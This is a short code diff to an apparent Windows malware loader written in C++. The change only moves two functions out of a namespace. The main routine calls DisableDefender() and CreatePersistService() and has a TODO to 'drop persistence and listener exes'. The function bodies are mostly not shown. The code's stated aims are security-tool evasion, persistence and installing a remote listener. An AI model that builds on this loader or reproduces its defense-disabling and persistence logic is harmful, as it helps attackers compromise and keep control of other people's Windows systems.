@@ -1,7 +1,7 @@
 #include "loader.hpp"
 
 int wmain() {
-	if (loader::DisableDefender() != 0) {
+	if (DisableDefender() != 0) {
 		// disabling defender failed
 	}
 
@@ -11,7 +11,7 @@ int wmain() {
 
 	// TODO: drop persistence and listener exes
 
-	if (loader::CreatePersistService() != 0) {
+	if (CreatePersistService() != 0) {
 		// creating persistent service failed
 	}
 
@@ -19,8 +19,6 @@ int wmain() {
 
 	return 0;
 }
-
-namespace loader {
 
 int DisableDefender() {
 	std::map<LPCWSTR, std::map<LPCWSTR, DWORD>>::iterator outer;
@@ -135,5 +133,4 @@ int CreatePersistService() {
 	// optionally set service group
 
 	return 0;
-}
 }
